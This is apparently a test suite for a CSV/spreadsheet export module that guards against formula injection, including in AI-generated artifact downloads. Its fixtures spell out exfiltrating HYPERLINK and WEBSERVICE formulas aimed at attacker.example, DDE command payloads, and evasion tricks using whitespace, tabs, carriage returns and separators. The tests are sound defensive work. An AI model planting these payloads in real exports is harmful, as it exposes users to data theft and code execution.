import { describe, expect, it } from 'vitest';
import {
  csvField,
  isNumericCell,
  neutralizeSpreadsheetText,
  parseDelimited,
  parseTabular,
  spreadsheetExportDelimiter,
  spreadsheetSafeExport,
  toCsv,
  type TabularData,
} from '../tabular';

const IMPORT_SEPARATORS = [',', ';', '\t'];

function importCells(text: string, separator: string): string[] {
  const cells: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i += 1) {
    const ch = text[i]!;
    if (quoted) {
      if (ch === '"' && text[i + 1] === '"') {
        cell += '"';
        i += 1;
      } else if (ch === '"') {
        quoted = false;
      } else {
        cell += ch;
      }
      continue;
    }
    if (ch === '"' && cell === '') {
      quoted = true;
    } else if (ch === separator || ch === '\r' || ch === '\n') {
      if (ch === '\r' && text[i + 1] === '\n') i += 1;
      cells.push(cell);
      cell = '';
    } else {
      cell += ch;
    }
  }
  cells.push(cell);
  return cells;
}

// a spreadsheet evaluates the whole cell it read, so the only cell this oracle forgives is
// one that is a number end to end. It deliberately does not forgive a numeric prefix: the
// text a number is glued to is chosen by whoever wrote the artifact.
function evaluableCells(text: string): string[] {
  const flagged = new Set<string>();
  for (const separator of IMPORT_SEPARATORS) {
    for (const cell of importCells(text, separator)) {
      if (/^[=+\-@]/.test(cell.replace(/^\s+/, '')) && !isNumericCell(cell)) flagged.add(cell);
    }
  }
  return [...flagged];
}

function table(columns: string[], rows: string[][]): TabularData {
  return { columns, rows, numericColumns: columns.map(() => false), source: 'json' };
}

describe('toCsv formula neutralization', () => {
  it('neutralizes cells that a spreadsheet would evaluate as a formula', () => {
    const csv = toCsv(
      table(
        ['name', 'note'],
        [
          ['=HYPERLINK("http://attacker.example/steal?u="&A2,"Click")', 'ok'],
          ["+1+cmd|'/c calc'!A0", '@SUM(1+1)*cmd'],
          ["-2+3+cmd|'/c calc'!A0", '\tleading tab'],
        ],
      ),
    );
    const cells = csv.split('\n').flatMap((line) => line.split(','));
    for (const cell of cells) {
      expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
    }
    expect(csv).toContain("'=HYPERLINK");
    expect(csv).toContain("'+1+cmd");
    expect(csv).toContain("'@SUM(1+1)*cmd");
    expect(csv).toContain("'-2+3+cmd");
    expect(csv).toContain("'\tleading tab");
  });

  it('neutralizes a formula header without breaking csv quoting', () => {
    const csv = toCsv(table(['=1+1,"x"'], [['plain']]));
    expect(csv.split('\n')[0]).toBe('"\'=1+1,""x"""');
  });

  it('neutralizes a formula hidden behind leading whitespace or a control character', () => {
    const csv = toCsv(
      table(
        ['a', 'b'],
        [
          [' =1+1', '\t+1'],
          [' @SUM(1)', '\r=2+2'],
        ],
      ),
    );
    const cells = csv
      .split('\n')
      .slice(1)
      .flatMap((line) => line.split(','));
    for (const cell of cells) {
      expect(cell.replace(/^"/, '')).toMatch(/^'/);
    }
  });

  it('leaves plain and negative numeric cells untouched', () => {
    const csv = toCsv(table(['qty', 'delta', 'label'], [['12', '-3.5', 'hello world']]));
    expect(csv).toBe('qty,delta,label\n12,-3.5,hello world');
  });

  // every numeric cell survives as itself; only the record start carries a guard, because the
  // importer that splits .csv on ';' reads the whole row as one cell that opens with '-'
  it('leaves currency, percentage and exponent numerics untouched', () => {
    const csv = toCsv(table(['a', 'b', 'c', 'd'], [['-1,234.50', '+12%', '-1e3', ' -3.5']]));
    expect(csv).toBe('a,b,c,d\n"\'-1,234.50",+12%,-1e3, -3.5');
    expect(toCsv(table(['a', 'b'], [['x', '-1,234.50']]))).toBe('a,b\nx,"-1,234.50"');
  });

  it('neutralizes formulas that arrive through parsed artifact content', () => {
    const parsed = parseTabular('name,value\nfoo,=WEBSERVICE("http://attacker.example")');
    expect(parsed).not.toBeNull();
    expect(toCsv(parsed!)).toContain('foo,"\'=WEBSERVICE');
  });
});

describe('csvField', () => {
  it('neutralizes and quotes one cell for csv writers outside this module', () => {
    expect(csvField('=1+1')).toBe("'=1+1");
    expect(csvField('@acme')).toBe("'@acme");
    expect(csvField('=a,b')).toBe('"\'=a,b"');
    expect(csvField('plain')).toBe('plain');
    expect(csvField('42')).toBe('42');
    expect(csvField('')).toBe('');
  });

  // the caller joins this cell into a row we never see, so the quotes only bind an importer
  // splitting on ','; one splitting on ';' or a tab reads them as text and re-splits the cell
  it('guards every field start an importer with another separator carves out of the cell', () => {
    expect(csvField('deleted; -rf /')).toBe('"deleted;\' -rf /"');
    expect(csvField('\t=1+1')).toBe('"\'\t\'=1+1"');
    expect(csvField('note\t=1+1')).toBe('"note\t\'=1+1"');
    expect(csvField('note, =1+1')).toBe('"note, =1+1"');
    expect(evaluableCells(csvField('deleted; -rf /'))).toEqual([]);
    expect(evaluableCells(csvField('note\t=1+1'))).toEqual([]);
  });
});

describe('a number the attacker glues a payload to', () => {
  // an importer evaluates the whole cell it read, so a leading number exempts nothing: the
  // newline in a quoted cell is formula whitespace, and ',' is the decimal separator in the
  // locale whose Excel splits .csv on ';'
  const numericLeadPayloads: Array<[string, string]> = [
    [
      'qty\n"+1\n+WEBSERVICE(""http://attacker.example/?d=""&A1)"',
      'qty\n"\'+1\n+WEBSERVICE(""http://attacker.example/?d=""&A1)"',
    ],
    ['qty\n"-1\n+cmd|\'/c calc\'!A0"', "qty\n\"'-1\n+cmd|'/c calc'!A0\""],
    ["qty,note\n-1,2+cmd|'/c calc'!A0", "qty,note\n'-1,2+cmd|'/c calc'!A0"],
    ["qty\n-1\t+cmd|'/c calc'!A0", "qty\n'-1\t'+cmd|'/c calc'!A0"],
    [
      'qty\n+1;=HYPERLINK("http://attacker.example")',
      'qty\n\'+1;\'=HYPERLINK("http://attacker.example")',
    ],
  ];

  it.each(numericLeadPayloads)(
    'guards the cell an artifact download would evaluate: %j',
    (payload, expected) => {
      expect(evaluableCells(payload)).not.toEqual([]);
      const exported = spreadsheetSafeExport(payload, 'csv').body;
      expect(exported).toBe(expected);
      expect(exported).not.toBe(payload);
      expect(evaluableCells(exported)).toEqual([]);
    },
  );

  it('guards the same payloads at csvField, the single-cell writer other packages call', () => {
    expect(csvField('-1\n+WEBSERVICE("https://attacker.example/?d="&A1)')).toBe(
      '"\'-1\n\'+WEBSERVICE(""https://attacker.example/?d=""&A1)"',
    );
    expect(csvField("-1\t+cmd|'/c calc'!A0")).toBe("\"'-1\t'+cmd|'/c calc'!A0\"");
    expect(csvField("-1,2+cmd|'/c calc'!A0")).toBe("\"'-1,2+cmd|'/c calc'!A0\"");
  });

  it('leaves no evaluable cell in a tool-history row built out of csvField', () => {
    const rows = [
      ['Timestamp', 'Tool', 'Result'],
      ['Aug 21', 'shell', '-1\n+WEBSERVICE("http://attacker.example/?d="&A1)'],
      ['Aug 21', 'shell', "ok\n=cmd|'/c calc'!A0"],
      ['Aug 21', 'read_file', '42'],
    ];
    const raw = rows.map((r) => r.join(',')).join('\n');
    const csv = rows.map((r) => r.map(csvField).join(',')).join('\n');
    expect(evaluableCells(raw)).not.toEqual([]);
    expect(evaluableCells(csv)).toEqual([]);
    expect(csv).toContain('Aug 21,read_file,42');
  });

  it('still exempts a numeric cell where the record is there to judge it', () => {
    expect(neutralizeSpreadsheetText('name,score\nAlice,30\nBob,-7')).toBe(
      'name,score\nAlice,30\nBob,-7',
    );
    expect(neutralizeSpreadsheetText('a,b,c\nx,-3.5,+12%')).toBe('a,b,c\nx,-3.5,+12%');
    expect(toCsv(table(['a', 'b'], [['x', '-3.5']]))).toBe('a,b\nx,-3.5');
  });

  // csvField has no record to judge, so it guards a signed number too: the caller can put
  // "2+cmd|'/c calc'!A0" in the next column and hand a european Excel one DDE formula
  it('guards a signed number at csvField, which never sees the row it lands in', () => {
    expect(csvField('-1')).toBe("'-1");
    expect(csvField('42')).toBe('42');
    expect(evaluableCells(['-1', "2+cmd|'/c calc'!A0"].map(csvField).join(','))).toEqual([]);
  });

  // the cost of judging the whole cell: an importer that splits .csv on ';' reads this record
  // as the single cell "-1,2 ok", so the record start is guarded even though the ',' reading
  // sees a plain -1. Loosening this back to a leading-token test reopens the payloads above.
  it('guards a record whose leading number is glued to text', () => {
    expect(neutralizeSpreadsheetText('a,b\n-1,2 ok')).toBe("a,b\n'-1,2 ok");
  });
});

describe('neutralizeSpreadsheetText', () => {
  const singleCellPayloads: Array<[string, string]> = [
    [
      '=WEBSERVICE("http://attacker.example/x"&A1)',
      '\'=WEBSERVICE("http://attacker.example/x"&A1)',
    ],
    ["=cmd|'/c calc'!A0", "'=cmd|'/c calc'!A0"],
    ["@SUM(1+1)*cmd|'/c calc'!A0", "'@SUM(1+1)*cmd|'/c calc'!A0"],
    ["+1+cmd|'/c calc'!A0", "'+1+cmd|'/c calc'!A0"],
    ['-2+3+cmd', "'-2+3+cmd"],
    [' =HYPERLINK("http://attacker.example")', '\' =HYPERLINK("http://attacker.example")'],
    // the tab is a separator to an importer that auto-detects one, so the payload is guarded
    // both as the first cell of a comma reading and as the second cell of a tab reading
    ['\t=1+1', "'\t'=1+1"],
    [' =1+1', "' =1+1"],
  ];

  it.each(singleCellPayloads)(
    'neutralizes content parseTabular rejects: %j',
    (payload, expected) => {
      expect(parseTabular(payload)).toBeNull();
      expect(evaluableCells(payload)).not.toEqual([]);
      expect(neutralizeSpreadsheetText(payload)).toBe(expected);
      expect(evaluableCells(neutralizeSpreadsheetText(payload))).toEqual([]);
    },
  );

  it('neutralizes a payload hidden behind a byte order mark without losing the mark', () => {
    expect(neutralizeSpreadsheetText('﻿=1+1')).toBe("﻿'=1+1");
  });

  it('guards a cell inside a table without re-quoting the row', () => {
    expect(
      neutralizeSpreadsheetText('name,value\nfoo,=WEBSERVICE("http://attacker.example")'),
    ).toBe('name,value\nfoo,\'=WEBSERVICE("http://attacker.example")');
  });

  it('guards inside the quotes of an already-quoted cell', () => {
    expect(neutralizeSpreadsheetText('a,"=1+1"')).toBe('a,"\'=1+1"');
    expect(evaluableCells(neutralizeSpreadsheetText('a,"=1+1"'))).toEqual([]);
  });

  it('never treats a delimiter or newline inside quotes as a cell boundary', () => {
    const content = 'a,b\n"x,=1+1","line\nbreak"';
    expect(neutralizeSpreadsheetText(content)).toBe(content);
  });

  it('guards every cell of a semicolon document a european excel would split', () => {
    const guarded = neutralizeSpreadsheetText('name;score\nAlice;=1+1');
    expect(guarded).toBe("name;score\nAlice;'=1+1");
    expect(evaluableCells(guarded)).toEqual([]);
  });

  it('leaves benign content byte-identical', () => {
    for (const content of ['just a sentence', 'name,age\nAlice,30', '', '   ']) {
      expect(neutralizeSpreadsheetText(content)).toBe(content);
    }
  });

  it('leaves the shapes a parse/serialize round trip used to mutate byte-identical', () => {
    const preserved = [
      'name,,city\nA,B,C',
      'a,b,c\n1,2\n3,4,5,6',
      'name;score\nAlice;30',
      ' name , score \n a , b ',
      'a,b\n1,2\n\n\n',
      'a,b\r\n1,2\r\n',
      'a,b\r1,2\r',
      'name,score\nAlice,30\n',
      '"quoted",plain\n"still ""quoted""",2',
      'name,quote\n"Smith, John","She said ""hi"""',
      'company,note\nAcme,"revenue, -5% yoy"\n',
      'name,score\nAlice,30\nBob,-7',
      'plain,-7,+12%, -3.5',
    ];
    for (const content of preserved) {
      expect(neutralizeSpreadsheetText(content)).toBe(content);
    }
  });

  it('keeps a tab document tab-delimited', () => {
    expect(neutralizeSpreadsheetText('name\tvalue\nfoo\t=1+1')).toBe("name\tvalue\nfoo\t'=1+1");
    expect(neutralizeSpreadsheetText('a,b\n1,"x\ty"')).toBe('a,b\n1,"x\ty"');
  });

  it('leaves no evaluable cell behind on a mixed adversarial document', () => {
    const content = [
      '=1+1,ok, +1+1,"=HYPERLINK(""http://attacker.example"")"',
      '\t=2+2;@SUM(1)\t,-5 apples',
      'plain,-7,+12%, -3.5',
    ].join('\r\n');
    const guarded = neutralizeSpreadsheetText(content);
    expect(evaluableCells(content)).not.toEqual([]);
    expect(evaluableCells(guarded)).toEqual([]);
    expect(guarded.split('\r\n')).toHaveLength(3);
    expect(guarded).toContain('plain,-7,+12%, -3.5');
  });
});

describe('neutralizeSpreadsheetText · record terminators an importer honours', () => {
  const crPayloads: Array<[string, string]> = [
    ["name,value\nalice,1\r=cmd|'/c calc'!A0,tail", "name,value\nalice,1\r'=cmd|'/c calc'!A0,tail"],
    [
      'name,value\r=HYPERLINK("http://attacker.example")',
      'name,value\r\'=HYPERLINK("http://attacker.example")',
    ],
    ["a,\r=cmd|'/c calc'!A0", "a,\r'=cmd|'/c calc'!A0"],
    ["name\r@SUM(1+1)*cmd|'/c calc'!A0", "name\r'@SUM(1+1)*cmd|'/c calc'!A0"],
    ['"=1+1"\r"=2+2"', '"\'=1+1"\r"\'=2+2"'],
    ['a,"x\r=1+1"', 'a,"x\r\'=1+1"'],
  ];

  it.each(crPayloads)('guards the cell a lone CR starts: %j', (payload, expected) => {
    expect(evaluableCells(payload)).not.toEqual([]);
    expect(neutralizeSpreadsheetText(payload)).toBe(expected);
    expect(evaluableCells(neutralizeSpreadsheetText(payload))).toEqual([]);
  });

  it('emits back the terminator it consumed', () => {
    for (const content of ['a,b\r1,2\r', 'a,b\r\n1,2\r\n', 'a,b\n1,2\n', 'a\rb\r\nc\nd']) {
      expect(neutralizeSpreadsheetText(content)).toBe(content);
    }
  });

  it('breaks a record on a lone CR when the artifact is read back as a grid', () => {
    expect(parseDelimited('a,b\r1,2', ',')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
    expect(parseDelimited('a,b\r\n1,2\r\n', ',')).toEqual([
      ['a', 'b'],
      ['1', '2'],
    ]);
  });
});

describe('neutralizeSpreadsheetText · separators an importer auto-detects', () => {
  it('guards a tab-delimited document downloaded under a .csv name', () => {
    const payload = 'name\tvalue\nalice\t=WEBSERVICE("http://attacker.example")';
    expect(evaluableCells(payload)).not.toEqual([]);
    expect(spreadsheetSafeExport(payload, 'csv').body).toBe(
      'name\tvalue\nalice\t\'=WEBSERVICE("http://attacker.example")',
    );
    expect(evaluableCells(spreadsheetSafeExport(payload, 'csv').body)).toEqual([]);
  });

  it('guards a lone CR inside a .tsv download too', () => {
    const payload = 'name\tvalue\ralice\t=1+1';
    expect(spreadsheetSafeExport(payload, 'tsv').body).toBe("name\tvalue\ralice\t'=1+1");
    expect(evaluableCells(spreadsheetSafeExport(payload, 'tsv').body)).toEqual([]);
  });

  it('guards a comma document a european excel splits on the semicolon instead', () => {
    const payload = 'name,value\nalice,"deleted; =cmd|\'/c calc\'!A0"';
    expect(evaluableCells(payload)).not.toEqual([]);
    expect(evaluableCells(spreadsheetSafeExport(payload, 'csv').body)).toEqual([]);
  });
});

describe('spreadsheetExportDelimiter', () => {
  it('claims every extension a spreadsheet opens as delimited text', () => {
    expect(spreadsheetExportDelimiter('csv')).toBe(',');
    expect(spreadsheetExportDelimiter('.CSV')).toBe(',');
    expect(spreadsheetExportDelimiter(' tsv ')).toBe('\t');
    expect(spreadsheetExportDelimiter('tab')).toBe('\t');
    expect(spreadsheetExportDelimiter('xls')).toBe(',');
  });

  it('reads the extension a double-barrelled language actually writes', () => {
    expect(spreadsheetExportDelimiter('data.csv')).toBe(',');
    expect(spreadsheetExportDelimiter('report.TSV')).toBe('\t');
    expect(spreadsheetExportDelimiter('csv.ts')).toBeNull();
  });

  it('reads the extension a filesystem keeps once it drops trailing dots and spaces', () => {
    expect(spreadsheetExportDelimiter('csv.')).toBe(',');
    expect(spreadsheetExportDelimiter('csv. ')).toBe(',');
    expect(spreadsheetExportDelimiter('csv .')).toBe(',');
    expect(spreadsheetExportDelimiter('data.tsv..')).toBe('\t');
  });

  it('claims the excel- and opendocument-openable text formats too', () => {
    for (const ext of [
      'slk',
      'sylk',
      'dif',
      'prn',
      'ods',
      'ots',
      'fods',
      'uos',
      'xlsx',
      'xlsm',
      'xlsb',
      'xlt',
      'xltx',
      'xltm',
      'xlam',
      'xla',
      'xlw',
    ]) {
      expect(spreadsheetExportDelimiter(ext)).not.toBeNull();
    }
  });

  it('leaves ordinary source and text extensions alone', () => {
    for (const ext of ['txt', 'ts', 'py', 'md', 'json', 'html', undefined, null, '']) {
      expect(spreadsheetExportDelimiter(ext)).toBeNull();
    }
  });
});

describe('spreadsheetSafeExport', () => {
  it('neutralizes any download named with a spreadsheet extension', () => {
    const csv = spreadsheetSafeExport("=cmd|'/c calc'!A0", 'csv');
    expect(csv.mimeType).toBe('text/csv;charset=utf-8;');
    expect(csv.body).toBe("'=cmd|'/c calc'!A0");

    const tsv = spreadsheetSafeExport('@SUM(1+1)*cmd', 'tsv');
    expect(tsv.mimeType).toBe('text/tab-separated-values;charset=utf-8;');
    expect(tsv.body).toBe("'@SUM(1+1)*cmd");
  });

  it.each(['slk', 'sylk', 'dif', 'ods', 'xlsm', 'xlsx', 'prn'])(
    'neutralizes the .%s file a model-chosen language can name',
    (extension) => {
      const payload = '=HYPERLINK("http://attacker.example/steal?u="&A1,"Click")';
      const exported = spreadsheetSafeExport(payload, extension);
      expect(exported.body).not.toBe(payload);
      expect(evaluableCells(exported.body)).toEqual([]);
      expect(exported.mimeType).not.toBe('text/plain');
    },
  );

  it('follows a language that hides the spreadsheet extension behind a dot', () => {
    const exported = spreadsheetSafeExport("=cmd|'/c calc'!A0", 'data.csv');
    expect(exported.body).toBe("'=cmd|'/c calc'!A0");
    expect(exported.mimeType).toBe('text/csv;charset=utf-8;');
  });

  it('hands the download sinks the original bytes when no cell needs guarding', () => {
    const content = ' name ;score\r\nAlice;30\r\n\r\n';
    expect(spreadsheetSafeExport(content, 'csv').body).toBe(content);
  });

  it('passes non-spreadsheet downloads through untouched', () => {
    const source = spreadsheetSafeExport('=> arrow, not a formula\n', 'ts');
    expect(source.body).toBe('=> arrow, not a formula\n');
    expect(source.mimeType).toBe('text/plain');
  });
});

describe('spreadsheetSafeExport · json array-of-objects artifacts', () => {
  const people = JSON.stringify([
    { Name: 'Alice', Age: 30 },
    { Name: 'Bob', Age: 41 },
  ]);

  it('serializes the grid the artifact renders instead of writing the json literal', () => {
    expect(spreadsheetSafeExport(people, 'csv').body).toBe('Name,Age\nAlice,30\nBob,41');
    expect(spreadsheetSafeExport(people, 'csv').mimeType).toBe('text/csv;charset=utf-8;');
  });

  it('serializes with tabs when the download is named .tsv', () => {
    const tsv = spreadsheetSafeExport(people, 'tsv');
    expect(tsv.body).toBe('Name\tAge\nAlice\t30\nBob\t41');
    expect(tsv.mimeType).toBe('text/tab-separated-values;charset=utf-8;');
  });

  it('neutralizes a formula carried in a json value or key', () => {
    const content = JSON.stringify([
      { name: 'Acme', link: '=HYPERLINK("http://attacker.example/steal?u="&A2,"Click")' },
      { name: 'Globex', link: "=cmd|'/c calc'!A0" },
    ]);
    const body = spreadsheetSafeExport(content, 'csv').body;
    expect(body).toContain('"\'=HYPERLINK');
    expect(body).toContain("Globex,'=cmd");
    expect(evaluableCells(body)).toEqual([]);
  });

  it('guards the second half of a json cell an importer splits on a tab', () => {
    const body = spreadsheetSafeExport(JSON.stringify([{ a: 'x\t=1+1' }]), 'csv').body;
    expect(body).toBe('a\n"x\t\'=1+1"');
    expect(evaluableCells(body)).toEqual([]);
  });

  it('leaves json that is not a table byte-identical', () => {
    for (const content of ['[1,2,3]', '[]', '{"a":1}', '[{"a":1}, not json']) {
      expect(spreadsheetSafeExport(content, 'csv').body).toBe(content);
    }
  });

  it('does not reshape a json artifact whose download is not a spreadsheet', () => {
    expect(spreadsheetSafeExport(people, 'json').body).toBe(people);
  });
});

describe('spreadsheetSafeExport · content a filesystem renames back to a sheet', () => {
  it('neutralizes a language whose trailing dot the filesystem drops', () => {
    expect(spreadsheetSafeExport("=cmd|'/c calc'!A0", 'csv.').body).toBe("'=cmd|'/c calc'!A0");
  });
});
